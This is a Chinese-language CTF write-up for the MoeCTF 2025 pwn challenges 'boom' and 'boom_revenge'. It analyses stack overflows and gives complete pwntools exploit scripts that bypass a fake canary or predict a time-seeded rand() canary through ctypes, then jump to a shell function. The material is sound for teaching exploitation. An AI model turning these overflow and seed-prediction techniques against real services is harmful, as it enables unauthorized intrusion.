---
title: "MoeCTF 2025 Pwn: boom&boom_revenge"
date: 2025-09-27 12:00:00 +0800
categories: [网络安全, Pwn]
tags: [MoeCTF, Pwn, 栈溢出, Canary]
description: 通过绕过伪 Canary 并预测基于时间种子的随机值，实现栈溢出利用。
---

## 题目简介

这是一道栈溢出题，校验逻辑并不复杂，但需要仔细分析程序中的 Canary 生成与校验方式。

**题目附件**

- [点击下载题目](/assets/files/moectf-2025-pwn-boom/pwn.zip)
- SHA-256：`537a7c6aa591b10866a1ff6143d2d4ab4581c125814304381290c57bd038af3e`

> 你可以轻易爆破我们的系统，但是一个不可泄露的"canary"你又该如何应对？
>
> 你可能需要使用 Python `ctypes` 包来直接调用 C 库函数。
>
> 本题解法与时间有关。如果出现本地能通、远程不通的情况，请多尝试几次。
{: .prompt-info }

## 题目分析

先对比 `boom` 与 `boom_revenge` 的 IDA 反编译结果。

### boom

![](/assets/img/posts/moectf-2025-pwn-boom/1.png)

### boom_revenge

![](/assets/img/posts/moectf-2025-pwn-boom/2.png)

两个程序都包含可直接利用的 `shell` 函数：

![](/assets/img/posts/moectf-2025-pwn-boom/3.png)

![](/assets/img/posts/moectf-2025-pwn-boom/4.png)

两个程序的整体结构基本相同，主要区别在于 `v5`、`v6` 和 Canary 的校验逻辑。

## boom：绕过伪 Canary

`boom` 中的 Canary 是人为实现的校验值，可以通过覆盖相关栈变量绕过。构造溢出数据时，将 `v6` 覆盖为 `0`，即可跳过 `exit(1)`，再将返回地址覆盖为 `shell` 函数地址。

Exploit 如下：

```python
from pwn import *

p = process("./pwn")
# p = remote("10.21.199.226", 52321)

p.recvuntil(b"(y/n)")
p.sendline(b"y")

payload = b"a" * 124       # 覆盖数组 s
payload += b"b" * 16       # 覆盖 v5
payload += p32(0)          # 将 v6 覆盖为 0，跳过 exit(1)
payload += b"c" * 8        # 覆盖 rbp
payload += p64(0x40127E)   # 返回到 shell 函数

p.sendlineafter(b"Enter your message: ", payload)
p.interactive()
```

![](/assets/img/posts/moectf-2025-pwn-boom/5.png)

这一解法不依赖时间种子，因此在本地和远程环境中都比较稳定。

## boom_revenge：预测 Canary

`boom_revenge` 会分别校验 `v5` 和 Canary，无法通过覆盖 `v6` 沿用上一种方法。关键突破口在于：Canary 使用当前时间作为伪随机数种子，因此可以在攻击端同步调用 `libc` 生成相同的值。

![](/assets/img/posts/moectf-2025-pwn-boom/6.png)

其 C 逻辑可简化为：

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main(void) {
    srand(time(NULL));
    int canary = rand() % 114514;
    printf("Canary: %d\n", canary);
    return 0;
}
```

在 Python 中通过 `ctypes` 直接调用同一个 C 库函数：

```python
from ctypes import CDLL
import time

libc = CDLL("libc.so.6")
libc.srand(int(time.time()))
canary = libc.rand() % 114514

print(f"Python predicted: {canary}")
```

完整 Exploit 如下：

```python
from ctypes import CDLL
from pwn import *
import time

p = process("./pwn2")
# p = remote("10.21.199.226", 52321)

p.recvuntil(b"(y/n)")
p.sendline(b"y")

libc = CDLL("libc.so.6")
current_time = int(time.time())
libc.srand(current_time)
predicted_canary = libc.rand() % 114514

payload = b"a" * 124
payload += p32(predicted_canary)  # 小端写入 v5 的前 4 字节
payload += b"b" * 12
payload += p32(1)
payload += b"c" * 8
payload += p64(0x40127E)

p.sendlineafter(b"Enter your message: ", payload)
p.interactive()
```

![](/assets/img/posts/moectf-2025-pwn-boom/7.png)

> 远程环境中存在网络和程序执行延迟，攻击端获取的时间可能与服务器使用的时间相差数秒。本次测试中，使用 `current_time = int(time.time()) - 2` 可以稳定成功；实际偏移量需根据远程环境进行微调。
{: .prompt-warning }

## 总结

两个程序虽然都存在栈溢出，但绕过方式不同：

- `boom` 通过覆盖栈上的校验变量，绕过人为实现的伪 Canary。
- `boom_revenge` 利用时间种子可预测的问题，通过 `ctypes` 调用 `libc` 恢复 Canary。

题目的核心不在于爆破，而在于识别伪随机数的可预测性，并让攻击端与目标程序使用相同的随机数状态。
